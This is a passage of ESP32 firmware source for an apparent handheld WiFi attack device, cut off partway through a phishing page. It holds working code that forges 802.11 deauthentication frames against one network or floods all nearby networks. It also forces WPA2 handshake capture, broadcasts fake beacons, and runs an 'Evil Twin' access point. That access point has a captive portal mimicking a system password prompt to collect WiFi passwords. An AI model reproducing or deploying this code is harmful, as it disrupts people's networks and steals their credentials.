    tft.setCursor(leftColX, msgY);
    tft.print("> Evil Twin active       ");
  } else if (capturedHandshake.captured) {
    tft.setTextColor(COLOR_GREEN);
    tft.setCursor(leftColX, msgY);
    tft.print("> Handshake captured!    ");
  }
}

// ==================== WiFi Functions ====================

void scanWiFiNetworks() {
  // Start continuous async scan
  continuousWiFiScan = true;
  networkCount = 0;
  scanDisplayOffset = 0;
  
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  
  currentState = WIFI_SCAN;
  addToConsole("AP scan started");
  
  // Start async scan (non-blocking)
  WiFi.scanNetworks(true);  // true = async mode
  
  // Initial display
  displayWiFiScanResults();
}

wifi_ap_record_t targetAP;
bool rogueAPActive = false;



void stopDeauth() {
  deauthActive = false;
  addToConsole("Deauth stopped");
  
  if (currentState == WIFI_ATTACK_MENU) {
    drawAttackMenu();
  }
}
// ==================== FUNCTION 1: startDeauth() - CLEANED ====================
void startDeauth() {
  if (selectedSSID.length() == 0 || networkCount == 0) {
    addToConsole("ERROR: No target");
    return;
  }
  
  int targetIndex = -1;
  for (int i = 0; i < networkCount; i++) {
    if (networks[i].ssid == selectedSSID) {
      targetIndex = i;
      break;
    }
  }
  
  if (targetIndex == -1) {
    addToConsole("ERROR: Target not found");
    return;
  }
  
  // ✅ FIX: Stop conflicting operations with proper delays
  if (snifferActive) {
    stopSniffer();
    delay(200);
  }
  if (portalActive) {
    stopCaptivePortal();
    delay(200);
  }
  if (beaconFloodActive) {
    beaconFloodActive = false;
    delay(100);
  }
  
  // ✅ FIX: Proper WiFi state machine
  Serial.println("[*] Initializing WiFi for deauth...");
  
  // Step 1: Clean shutdown
  esp_wifi_stop();
  delay(200);
  esp_task_wdt_reset();
  
  // Step 2: Set mode to NULL first
  WiFi.mode(WIFI_MODE_NULL);
  delay(100);
  esp_task_wdt_reset();
  
  // Step 3: Set to AP mode
  WiFi.mode(WIFI_AP);
  delay(200);
  esp_task_wdt_reset();
  
  // Step 4: Start WiFi
  esp_wifi_start();
  delay(200);
  esp_task_wdt_reset();
  
  // Step 5: Set channel
  esp_wifi_set_channel(networks[targetIndex].channel, WIFI_SECOND_CHAN_NONE);
  delay(100);
  
  deauthActive = true;
  deauthPacketsSent = 0;
  
  String methodName = (currentDeauthMethod == 0) ? "Standard" : "Storm";
  addToConsole("Deauth: " + methodName + " on " + selectedSSID);
  
  Serial.printf("[+] Deauth active: %s on %s (Ch %d)\n", 
                methodName.c_str(), selectedSSID.c_str(), networks[targetIndex].channel);
  
  if (currentState == WIFI_ATTACK_MENU) {
    drawAttackMenu();
  }
}

// ==================== FUNCTION 2: performDeauth() - CLEANED ====================
void performDeauth() {
  static unsigned long lastDisplayUpdate = 0;
  
  // Find target network
  int targetIndex = -1;
  for (int i = 0; i < networkCount; i++) {
    if (networks[i].ssid == selectedSSID) {
      targetIndex = i;
      break;
    }
  }
  
  if (targetIndex == -1) return;
  
  uint8_t *bssid = networks[targetIndex].bssid;
  uint8_t channel = networks[targetIndex].channel;
  
  // Ensure WiFi is in correct mode and channel
  static uint8_t lastChannel = 0;
  if (lastChannel != channel) {
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    lastChannel = channel;
  }
  
  // METHOD 0: Standard Deauth (single targeted packet)
  if (currentDeauthMethod == 0) {
    uint8_t deauthPacket[26] = {
      0xC0, 0x00,                         // Type/Subtype: Deauthentication
      0x3A, 0x01,                         // Duration
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: Broadcast
      bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], // Source: AP
      bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], // BSSID: AP
      0x00, 0x00,                         // Sequence number
      0x02, 0x00                          // Reason code
    };
    
    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
    SAFE_INCREMENT(deauthPacketsSent);
  }
  
  // METHOD 1: Storm Mode (burst attack)
  else if (currentDeauthMethod == 1) {
    // Send 5 rapid deauth packets
    for (int i = 0; i < 5; i++) {
      uint8_t deauthPacket[26] = {
        0xC0, 0x00, 0x3A, 0x01,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // To: Broadcast
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],  // From: AP
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],  // BSSID
        (uint8_t)(i & 0xFF), (uint8_t)((i >> 8) & 0xFF),  // Sequence
        0x02, 0x00  // Reason
      };
      
      esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
      delayMicroseconds(100);
      SAFE_INCREMENT(deauthPacketsSent);
    }
  }
}

// ==================== startDeauthFlood() ====================
void startDeauthFlood() {
  if (deauthFloodActive) return;
  
  Serial.println("\n========== STARTING DEAUTH FLOOD ==========");
  
  // Stop conflicting operations
  if (snifferActive) {
    stopSniffer();
    delay(200);
  }
  if (portalActive) {
    stopCaptivePortal();
    delay(200);
  }
  if (beaconFloodActive) {
    beaconFloodActive = false;
    delay(100);
  }
  
  // Setup WiFi
  Serial.println("[*] Initializing WiFi for deauth flood...");
  esp_wifi_stop();
  delay(200);
  esp_task_wdt_reset();
  
  WiFi.mode(WIFI_MODE_NULL);
  delay(100);
  esp_task_wdt_reset();
  
  WiFi.mode(WIFI_AP);
  delay(200);
  esp_task_wdt_reset();
  
  esp_wifi_start();
  delay(200);
  esp_task_wdt_reset();
  
  // Load all scanned networks as targets
  deauthTargetCount = 0;
  for (int i = 0; i < networkCount && i < 50; i++) {
    deauthTargets[i].ssid = networks[i].ssid;
    memcpy(deauthTargets[i].bssid, networks[i].bssid, 6);
    deauthTargets[i].channel = networks[i].channel;
    deauthTargets[i].packetsSent = 0;
    deauthTargets[i].active = true;
    deauthTargetCount++;
  }
  
  deauthFloodActive = true;
  deauthFloodPackets = 0;
  lastDeauthFloodUpdate = millis();
  
  currentState = MenuState::WIFI_BLE_NRF_JAM; // Reuse this state for flood
  
  Serial.printf("[+] Deauth flood started - %d targets\n", deauthTargetCount);
  addToConsole("Deauth flood: " + String(deauthTargetCount) + " targets");
  
  displayDeauthFlood();
}

// ==================== stopDeauthFlood() ====================
void stopDeauthFlood() {
  if (!deauthFloodActive) return;
  
  deauthFloodActive = false;
  
  Serial.println("\n[*] Stopping deauth flood...");
  Serial.printf("    Total packets sent: %d\n", deauthFloodPackets);
  
  addToConsole("Deauth flood stopped");
  
  currentState = WIFI_MENU;
  drawWiFiMenu();
}

// ==================== performDeauthFlood() ====================
  void performDeauthFlood() {
    if (!deauthFloodActive || deauthTargetCount == 0) return;
    
    static unsigned long lastBurst = 0;
    
    // Send burst every 100ms (like Marauder)
    if (millis() - lastBurst < 100) return;
    lastBurst = millis();
    
    // Send to ALL targets in rapid succession
    for (int i = 0; i < deauthTargetCount; i++) {
      DeauthTarget* target = &deauthTargets[i];
      
      if (!target->active) continue;
      
      // Set channel for this target
      esp_wifi_set_channel(target->channel, WIFI_SECOND_CHAN_NONE);
      
      // Send 3 deauth packets per target (like Marauder)
      for (int burst = 0; burst < 3; burst++) {
        uint8_t deauthPacket[26] = {
          0xC0, 0x00, 0x3A, 0x01,
          0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // To: Broadcast
          target->bssid[0], target->bssid[1], target->bssid[2], 
          target->bssid[3], target->bssid[4], target->bssid[5], // From: AP
          target->bssid[0], target->bssid[1], target->bssid[2], 
          target->bssid[3], target->bssid[4], target->bssid[5], // BSSID
          (uint8_t)(burst & 0xFF), 0x00, // Sequence
          0x07, 0x00 // Reason: Class 3 frame from non-associated STA
        };
        
        esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
        delayMicroseconds(100); // Small delay between bursts
        
        target->packetsSent++;
        deauthFloodPackets++;
      }
    }
    
    // Feed watchdog after burst
    esp_task_wdt_reset();
  }

// ==================== displayDeauthFlood() ====================
void displayDeauthFlood() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("deauth flood");
  
  // Live indicator
  static bool blink = false;
  blink = !blink;
  tft.fillCircle(220, 12, 3, blink ? COLOR_RED : COLOR_DARK_GREEN);
  
  // Stats bar - compact
  int statsY = HEADER_HEIGHT + 5;
  tft.setTextSize(1);
  
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN, statsY);
  tft.printf("Targets:%d", deauthTargetCount);
  
  tft.setTextColor(COLOR_ORANGE);
  tft.setCursor(100, statsY);
  tft.printf("Sent:%d", deauthFloodPackets);
  
  // Packets per second
  unsigned long runtime = max(1UL, (millis() - lastDeauthFloodUpdate) / 1000);
  uint32_t pps = deauthFloodPackets / runtime;
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(180, statsY);
  tft.printf("%d/s", pps);
  
  // Separator
  int listY = HEADER_HEIGHT + 22;
  tft.drawFastHLine(0, listY - 2, 240, COLOR_DARK_GREEN);
  
  // Column headers
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, listY);
  tft.print("TARGET");
  tft.setCursor(130, listY);
  tft.print("CH");
  tft.setCursor(155, listY);
  tft.print("PKTS");
  
  tft.drawFastHLine(0, listY + 12, 240, COLOR_DARK_GREEN);
  listY += 15;
  
  // Display targets (max 9 visible)
  int displayCount = min(deauthTargetCount, 9);
  
  for (int i = 0; i < displayCount; i++) {
    int y = listY + (i * 22);
    
    // SSID
    String displaySSID = deauthTargets[i].ssid;
    if (displaySSID.length() == 0) displaySSID = "<hidden>";
    if (displaySSID.length() > 16) displaySSID = displaySSID.substring(0, 15) + "~";
    
    tft.setTextColor(COLOR_TEXT);
    tft.setTextSize(1);
    tft.setCursor(SIDE_MARGIN, y);
    tft.print(displaySSID);
    
    // Channel
    tft.setTextColor(COLOR_CYAN);
    tft.setCursor(130, y);
    tft.printf("%2d", deauthTargets[i].channel);
    
    // Packets sent
    tft.setTextColor(COLOR_ORANGE);
    tft.setCursor(155, y);
    tft.printf("%4d", deauthTargets[i].packetsSent);
  }
  
  // Footer message
  int msgY = listY + (displayCount * 22) + 10;
  tft.drawFastHLine(0, msgY, 240, COLOR_DARK_GREEN);
  msgY += 8;
  
  tft.setTextColor(COLOR_YELLOW);
  tft.setTextSize(1);
  tft.setCursor(SIDE_MARGIN, msgY);
  tft.print("Flooding all networks with");
  msgY += 12;
  tft.setCursor(SIDE_MARGIN, msgY);
  tft.print("deauth packets...");
  
  // Stop button
  int backY = 305;
  tft.drawFastHLine(0, backY - 2, 240, COLOR_GREEN);
  tft.setTextColor(COLOR_RED);
  tft.setCursor(75, backY + 3);
  tft.print("[TAP] Stop");
}

// ==================== NEW: updateDeauthFloodDisplay() ====================
void updateDeauthFloodDisplay() {
  static unsigned long lastUpdate = 0;
  if (millis() - lastUpdate < 300) return;
  lastUpdate = millis();
  
  // Update only dynamic stats (avoid full redraw)
  int statsY = HEADER_HEIGHT + 5;
  
  // Clear stats area
  tft.fillRect(100, statsY, 140, 12, COLOR_BG);
  
  // Update packets sent
  tft.setTextColor(COLOR_ORANGE);
  tft.setTextSize(1);
  tft.setCursor(100, statsY);
  tft.printf("Sent:%d", deauthFloodPackets);
  
  // Update rate
  unsigned long runtime = max(1UL, (millis() - lastDeauthFloodUpdate) / 1000);
  uint32_t pps = deauthFloodPackets / runtime;
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(180, statsY);
  tft.printf("%d/s", pps);
  
  // Update individual target counters
  int listY = HEADER_HEIGHT + 37;
  int displayCount = min(deauthTargetCount, 9);
  
  for (int i = 0; i < displayCount; i++) {
    int y = listY + (i * 22);
    
    // Clear packet count area
    tft.fillRect(155, y, 80, 10, COLOR_BG);
    
    // Redraw packet count
    tft.setTextColor(COLOR_ORANGE);
    tft.setCursor(155, y);
    tft.printf("%4d", deauthTargets[i].packetsSent);
  }
}


// ==================== STANDALONE HANDSHAKE CAPTURE ====================
void startHandshakeCapture() {
  if (selectedSSID.length() == 0 || networkCount == 0) {
    showMessage("No target selected!", COLOR_WARNING);
    return;
  }
  
  int targetIndex = -1;
  for (int i = 0; i < networkCount; i++) {
    if (networks[i].ssid == selectedSSID) {
      targetIndex = i;
      break;
    }
  }
  
  if (targetIndex == -1) return;
  
  // Reset handshake
  capturedHandshake.captured = false;
  memset(&capturedHandshake, 0, sizeof(HandshakeData));
  
  // Stop conflicting operations
  if (portalActive) stopCaptivePortal();
  if (beaconFloodActive) beaconFloodActive = false;
  
  // Set up promiscuous mode for handshake capture
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&wifiSnifferCallback);
  esp_wifi_set_channel(networks[targetIndex].channel, WIFI_SECOND_CHAN_NONE);
  
  // Start deauth to force handshake
  deauthActive = true;
  currentDeauthMethod = 0; // Use standard deauth
  deauthPacketsSent = 0;
  
  currentState = HANDSHAKE_CAPTURE;
  
  Serial.printf("[*] Handshake capture mode on %s (Ch %d)\n", 
                selectedSSID.c_str(), 
                networks[targetIndex].channel);
  
  addToConsole("Capturing handshake...");
  displayHandshakeCapture();
}

void displayHandshakeCapture() {
  static bool needsFullRedraw = true;
  static bool lastCapturedState = false;
  
  if (needsFullRedraw || (capturedHandshake.captured != lastCapturedState)) {
    tft.fillScreen(COLOR_BG);
    drawTerminalHeader("handshake capture");
    needsFullRedraw = false;
    lastCapturedState = capturedHandshake.captured;
  }
  
  // Live indicator
  static bool blink = false;
  blink = !blink;
  tft.fillCircle(220, 12, 3, blink ? COLOR_GREEN : COLOR_DARK_GREEN);
  
  int y = HEADER_HEIGHT + 10;
  
  // Clear dynamic area only
  tft.fillRect(0, y, 240, 270, COLOR_BG);
  
  // Target info - compact
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("Target: ");
  tft.setTextColor(COLOR_YELLOW);
  String truncSSID = selectedSSID;
  if (truncSSID.length() > 18) truncSSID = truncSSID.substring(0, 17) + "~";
  tft.print(truncSSID);
  
  // Channel on same line
  int targetIndex = -1;
  for (int i = 0; i < networkCount; i++) {
    if (networks[i].ssid == selectedSSID) {
      targetIndex = i;
      break;
    }
  }
  
  if (targetIndex != -1) {
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.print(" Ch");
    tft.setTextColor(COLOR_CYAN);
    tft.printf("%d", networks[targetIndex].channel);
  }
  
  y += 18;
  tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
  y += 8;
  
  // Deauth stats - compact
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("Deauth:");
  
  tft.setTextColor(COLOR_ORANGE);
  tft.setCursor(55, y);
  tft.printf("%d", deauthPacketsSent);
  
  // Packets per second
  static unsigned long lastPktCount = 0;
  static unsigned long lastPktTime = 0;
  static uint32_t packetsPerSec = 0;
  if (millis() - lastPktTime > 1000) {
    packetsPerSec = deauthPacketsSent - lastPktCount;
    lastPktCount = deauthPacketsSent;
    lastPktTime = millis();
  }
  
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(100, y);
  tft.printf("(%d/s)", packetsPerSec);
  
  y += 18;
  
  // Handshake status
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("Handshake: ");
  
  if (capturedHandshake.captured) {
    // BLINK EFFECT when captured
    static unsigned long captureBlinkTime = 0;
    if (captureBlinkTime == 0) captureBlinkTime = millis();
    
    bool showText = true;
    if (millis() - captureBlinkTime < 5000) {
      showText = (millis() / 200) % 2 == 0;
    }
    
    if (showText) {
      tft.setTextColor(COLOR_GREEN);
      tft.print("CAPTURED!");
    }
    
    y += 20;
    tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
    y += 8;
    
    // MAC addresses - compact format
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setCursor(SIDE_MARGIN, y);
    tft.print("AP:");
    tft.setTextColor(COLOR_CYAN);
    tft.setCursor(30, y);
    tft.printf("%02X:%02X:%02X:%02X:%02X:%02X", 
               capturedHandshake.apMAC[0], capturedHandshake.apMAC[1],
               capturedHandshake.apMAC[2], capturedHandshake.apMAC[3],
               capturedHandshake.apMAC[4], capturedHandshake.apMAC[5]);
    
    y += 15;
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setCursor(SIDE_MARGIN, y);
    tft.print("CL:");
    tft.setTextColor(COLOR_CYAN);
    tft.setCursor(30, y);
    tft.printf("%02X:%02X:%02X:%02X:%02X:%02X", 
               capturedHandshake.clientMAC[0], capturedHandshake.clientMAC[1],
               capturedHandshake.clientMAC[2], capturedHandshake.clientMAC[3],
               capturedHandshake.clientMAC[4], capturedHandshake.clientMAC[5]);
    
    y += 20;
    tft.setTextColor(COLOR_GREEN);
    tft.setCursor(SIDE_MARGIN, y);
    tft.println("Ready to validate passwords!");
    
  } else {
    tft.setTextColor(COLOR_YELLOW);
    tft.print("WAITING...");
    
    y += 20;
    tft.setTextColor(COLOR_TEXT);
    tft.setCursor(SIDE_MARGIN, y);
    tft.print("Forcing 4-way handshake");
    
    // Animated dots
    int dots = (millis() / 500) % 4;
    for (int i = 0; i < 3; i++) {
      tft.print(i < dots ? "." : " ");
    }
  }
  
  y += 25;
  tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
  y += 8;
  
  // Duration
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("Duration: ");
  unsigned long runtime = (millis() - lastAttackTime) / 1000;
  tft.setTextColor(COLOR_CYAN);
  tft.printf("%d sec", runtime);
  
  // ✅ FIXED: Consistent stop button style
  int backY = 305;
  tft.drawFastHLine(0, backY - 2, 240, COLOR_GREEN);
  tft.setTextColor(COLOR_RED);
  tft.setCursor(75, backY + 3);
  tft.print("[TAP] Stop");
}

void performBeaconFlood() {
  if (customBeaconCount == 0) return;
  
  static bool initialized = false;
  static int beaconIndex = 0;
  static uint8_t channel = 1;
  static unsigned long lastChannelHop = 0;
  static unsigned long lastBeacon = 0;
  
  // ✅ FIX 1: Rate limiting to prevent crash (max 10 beacons/sec)
  if (millis() - lastBeacon < 100) return;
  lastBeacon = millis();
  
  // ✅ FIX 2: Watchdog reset
  esp_task_wdt_reset();
  
  if (!initialized) {
    // Stop any existing WiFi first
    wifi_mode_t currentMode;
    esp_wifi_get_mode(&currentMode);
    if (currentMode != WIFI_MODE_NULL) {
      esp_wifi_stop();
    }
    delay(100);
    
    // Start in AP mode
    wifi_config_t ap_config = {};
    strcpy((char*)ap_config.ap.ssid, "P4WNC4K3");
    ap_config.ap.ssid_len = strlen("P4WNC4K3");
    ap_config.ap.channel = 1;
    ap_config.ap.authmode = WIFI_AUTH_OPEN;
    ap_config.ap.max_connection = 0;
    ap_config.ap.beacon_interval = 60000;
    
    esp_wifi_set_mode(WIFI_MODE_AP);
    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    esp_wifi_start();
    delay(200);
    
    initialized = true;
  }
  
  // Get SSID to broadcast
  String fakeSSID = customBeacons[beaconIndex];
  beaconIndex = (beaconIndex + 1) % customBeaconCount;
  
  // ✅ FIX 3: Length validation
  if (fakeSSID.length() == 0 || fakeSSID.length() > 32) {
    return;  // Skip invalid SSID
  }
  
  // Create proper beacon frame
  uint8_t beaconPacket[200];
  int packetSize = 0;
  
  // === 802.11 MAC Header ===
  beaconPacket[0] = 0x80;
  beaconPacket[1] = 0x00;
  
  // Duration
  beaconPacket[2] = 0x00;
  beaconPacket[3] = 0x00;
  
  // Destination address (broadcast)
  for (int i = 4; i < 10; i++) beaconPacket[i] = 0xFF;
  
  // Source address (random MAC)
  for (int i = 10; i < 16; i++) beaconPacket[i] = random(0, 256);
  
  // BSSID (same as source)
  for (int i = 16; i < 22; i++) beaconPacket[i] = beaconPacket[i - 6];
  
  // Sequence number
  beaconPacket[22] = 0x00;
  beaconPacket[23] = 0x00;
  
  // === Beacon Frame Body ===
  uint64_t timestamp = esp_timer_get_time();
  memcpy(&beaconPacket[24], &timestamp, 8);
  
  beaconPacket[32] = 0x64;  // Beacon interval
  beaconPacket[33] = 0x00;
  
  beaconPacket[34] = 0x01;  // Capability
  beaconPacket[35] = 0x00;
  
  packetSize = 36;
  
  // === Information Elements ===
  beaconPacket[packetSize++] = 0x00;  // SSID tag
  beaconPacket[packetSize++] = fakeSSID.length();
  memcpy(&beaconPacket[packetSize], fakeSSID.c_str(), fakeSSID.length());
  packetSize += fakeSSID.length();
  
  // Supported rates
  beaconPacket[packetSize++] = 0x01;
  beaconPacket[packetSize++] = 0x08;
  beaconPacket[packetSize++] = 0x82;
  beaconPacket[packetSize++] = 0x84;
  beaconPacket[packetSize++] = 0x8B;
  beaconPacket[packetSize++] = 0x96;
  beaconPacket[packetSize++] = 0x24;
  beaconPacket[packetSize++] = 0x30;
  beaconPacket[packetSize++] = 0x48;
  beaconPacket[packetSize++] = 0x6C;
  
  // DS Parameter
  beaconPacket[packetSize++] = 0x03;
  beaconPacket[packetSize++] = 0x01;
  beaconPacket[packetSize++] = channel;
  
  // TIM
  beaconPacket[packetSize++] = 0x05;
  beaconPacket[packetSize++] = 0x04;
  beaconPacket[packetSize++] = 0x00;
  beaconPacket[packetSize++] = 0x01;
  beaconPacket[packetSize++] = 0x00;
  beaconPacket[packetSize++] = 0x00;
  
  // ✅ FIX 4: Validate packet size before sending
  if (packetSize > 0 && packetSize < 200) {
    esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, packetSize, false);
  }
  
  // Channel hopping (every 50 beacons)
  static int beaconCount = 0;
  beaconCount++;
  if (beaconCount % 50 == 0) {
    channel = (channel % 13) + 1;
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  }
  
  // ✅ FIX 5: Delay to prevent overwhelming
  delay(10);
  
  if (!beaconFloodActive) {
    initialized = false;
  }
}

void startCaptivePortal() {
  if (selectedSSID.length() == 0) {
    if (networkCount > 0) {
      selectedSSID = networks[0].ssid;
    } else {
      showMessage("No networks found!", COLOR_WARNING);
      delay(1000);
      return;
    }
  }
  
  portalActive = true;
  
  if (snifferActive) stopSniffer();
  if (deauthActive) stopDeauth();
  WiFi.disconnect();
  delay(100);
  
  WiFi.mode(WIFI_AP);
  WiFi.softAP(selectedSSID.c_str());
  
  for (int i = 0; i < networkCount; i++) {
    if (networks[i].ssid == selectedSSID) {
      esp_wifi_set_channel(networks[i].channel, WIFI_SECOND_CHAN_NONE);
      break;
    }
  }
  
  dnsServer.start(53, "*", WiFi.softAPIP());
  
  webServer.on("/", HTTP_GET, handlePortalRoot);
  webServer.on("/post", HTTP_POST, handlePortalPost);
  webServer.on("/generate_204", HTTP_GET, handlePortalRoot);
  webServer.on("/gen_204", HTTP_GET, handlePortalRoot);
  webServer.on("/hotspot-detect.html", HTTP_GET, handlePortalRoot);
  webServer.on("/canonical.html", HTTP_GET, handlePortalRoot);
  webServer.on("/success.txt", HTTP_GET, handlePortalRoot);
  webServer.onNotFound(handlePortalRoot);
  webServer.begin();
  
  addToConsole("Portal started: " + selectedSSID);
  showMessage("Captive portal active!", COLOR_SUCCESS);
  delay(2000);
  drawWiFiMenu();
}

// ==================== EVIL TWIN (Portal + Deauth) ====================
void startEvilTwin() {
  if (selectedSSID.length() == 0 || networkCount == 0) {
    addToConsole("ERROR: No target");
    drawAttackMenu();
    return;
  }
  
  int targetIndex = -1;
  for (int i = 0; i < networkCount; i++) {
    if (networks[i].ssid == selectedSSID) {
      targetIndex = i;
      break;
    }
  }
  
  if (targetIndex == -1) {
    addToConsole("ERROR: Target not found");
    drawAttackMenu();
    return;
  }
  
  if (snifferActive) stopSniffer();
  if (currentState == HANDSHAKE_CAPTURE) {
    esp_wifi_set_promiscuous(false);
  }
  
  WiFi.mode(WIFI_AP);
  WiFi.softAP(selectedSSID.c_str());
  delay(200);
  esp_wifi_set_channel(networks[targetIndex].channel, WIFI_SECOND_CHAN_NONE);
  
  deauthActive = true;
  deauthPacketsSent = 0;
  currentDeauthMethod = 0;
  portalActive = true;
  
  IPAddress apIP = WiFi.softAPIP();
  dnsServer.start(53, "*", apIP);
  
  webServer.on("/", HTTP_GET, handlePortalRoot);
  webServer.on("/post", HTTP_POST, handlePortalPost);
  webServer.on("/generate_204", HTTP_GET, handlePortalRoot);
  webServer.on("/gen_204", HTTP_GET, handlePortalRoot);
  webServer.on("/hotspot-detect.html", HTTP_GET, handlePortalRoot);
  webServer.on("/canonical.html", HTTP_GET, handlePortalRoot);
  webServer.on("/success.txt", HTTP_GET, handlePortalRoot);
  webServer.onNotFound(handlePortalRoot);
  webServer.begin();
  
  addToConsole("Evil Twin started");
  drawAttackMenu();
}

void stopCaptivePortal() {
  portalActive = false;
  webServer.stop();
  dnsServer.stop();
  
  if (deauthActive) {
    deauthActive = false;
  }
  
  esp_wifi_stop();
  delay(100);
  WiFi.mode(WIFI_STA);
  
  addToConsole("Evil Twin stopped");
  
  if (currentState == WIFI_ATTACK_MENU) {
    drawAttackMenu();
  }
}

void handlePortalRoot() {
  String html = "<!DOCTYPE html><html><head>";
  html += "<title>Wi-Fi Login</title>";
  html += "<meta name='viewport' content='width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no'>";
  html += "<meta http-equiv='Cache-Control' content='no-cache, no-store, must-revalidate'>";
  html += "<style>";
  html += "*{margin:0;padding:0;box-sizing:border-box;}";
  html += "body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;";
  html += "background:#e5e5e5;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:10px;}";
  html += ".container{background:#f0f0f0;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.15);";
  html += "width:100%;max-width:450px;}";
  html += ".header{background:linear-gradient(180deg,#d8d8d8 0%,#c8c8c8 100%);padding:15px;";
  html += "border-radius:12px 12px 0 0;display:flex;align-items:center;gap:15px;border-bottom:1px solid #b0b0b0;}";
  html += ".wifi-icon{min-width:50px;width:50px;height:50px;display:flex;align-items:center;justify-content:center;}";
  html += ".wifi-icon svg{width:100%;height:100%;}";
  html += ".header-text{flex:1;min-width:0;}";
  html += ".network-name{font-size:15px;font-weight:600;color:#000;margin:0 0 4px 0;word-wrap:break-word;}";
  html += ".network-info{font-size:12px;color:#505050;margin:0;}";
  html += ".content{padding:20px;}";
  html += ".form-group{margin-bottom:15px;}";
  html += "label{display:flex;flex-direction:column;color:#000;font-size:13px;font-weight:500;margin-bottom:8px;}";
  html += "@media (min-width: 400px){label{flex-direction:row;align-items:center;gap:10px;}}";
  html += "label span{min-width:80px;text-align:left;}";
  html += "@media (min-width: 400px){label span{text-align:right;}}";
  html += "input[type='password']{flex:1;padding:10px 12px;border:2px solid #a0a0a0;border-radius:6px;";
  html += "font-size:16px;background:#fff;width:100%;-webkit-appearance:none;}";
  html += "input[type='password']:focus{outline:none;border-color:#007AFF;box-shadow:0 0 0 3px rgba(0,122,255,0.2);}";
  html += ".checkbox-group{display:flex;align-items:center;gap:8px;margin-bottom:12px;padding-left:0;}";
  html += "@media (min-width: 400px){.checkbox-group{padding-left:90px;}}";
  html += "input[type='checkbox']{width:18px;height:18px;cursor:pointer;accent-color:#007AFF;flex-shrink:0;}";
  html += ".checkbox-label{font-size:13px;color:#000;user-select:none;cursor:pointer;}";
  html += ".footer{display:flex;justify-content:space-between;align-items:center;padding:12px 20px;";
  html += "background:linear-gradient(180deg,#e8e8e8 0%,#d8d8d8 100%);border-radius:0 0 12px 12px;border-top:1px solid #c0c0c0;";
  html += "flex-wrap:wrap;gap:10px;}";
  html += ".help-btn{width:28px;height:28px;border-radius:50%;background:#fff;border:1px solid #a0a0a0;";
  html += "color:#007AFF;font-size:16px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;flex-shrink:0;}";
  html += ".action-btns{display:flex;gap:10px;flex:1;justify-content:flex-end;}";
  html += "@media (max-width: 350px){.action-btns{width:100%;justify-content:space-between;}}";
  html += ".btn{padding:8px 16px;border-radius:6px;font-size:13px;font-weight:500;cursor:pointer;border:1px solid;";
  html += "white-space:nowrap;min-width:70px;text-align:center;}";
  html += ".btn-cancel{background:#fff;border-color:#a0a0a0;color:#000;}";
  html += ".btn-join{background:#007AFF;border-color:#007AFF;color:#fff;opacity:0.4;pointer-events:none;}";
  html += ".btn-join.active{opacity:1;pointer-events:auto;}";
  html += ".btn-join:active{background:#0051D5;}";
  html += "</style></head><body>";
  html += "<div class='container'>";
  html += "<div class='header'>";
  html += "<div class='wifi-icon'>";
  html += "<svg viewBox='0 0 60 60' fill='none' xmlns='http://www.w3.org/2000/svg'>";
  html += "<path d='M30 45 C32.5 45 35 42.5 35 40 C35 37.5 32.5 35 30 35 C27.5 35 25 37.5 25 40 C25 42.5 27.5 45 30 45Z' fill='#007AFF'/>";
  html += "<path d='M30 30 C25 30 20 32.5 17 37' stroke='#007AFF' stroke-width='3' stroke-linecap='round' fill='none'/>";
  html += "<path d='M30 30 C35 30 40 32.5 43 37' stroke='#007AFF' stroke-width='3' stroke-linecap='round' fill='none'/>";
  html += "<path d='M30 20 C22 20 14 24 9 30' stroke='#007AFF' stroke-width='3' stroke-linecap='round' fill='none'/>";
  html += "<path d='M30 20 C38 20 46 24 51 30' stroke='#007AFF' stroke-width='3' stroke-linecap='round' fill='none'/>";
  html += "</svg>";
  html += "</div>";
  html += "<div class='header-text'>";
  html += "<h2 class='network-name'>Enter password for \"" + selectedSSID + "\"</h2>";
  html += "<p class='network-info'>WPA2 Protected Network</p>";
  html += "</div></div>";
  html += "<form action='/post' method='post' id='wifiForm'>";
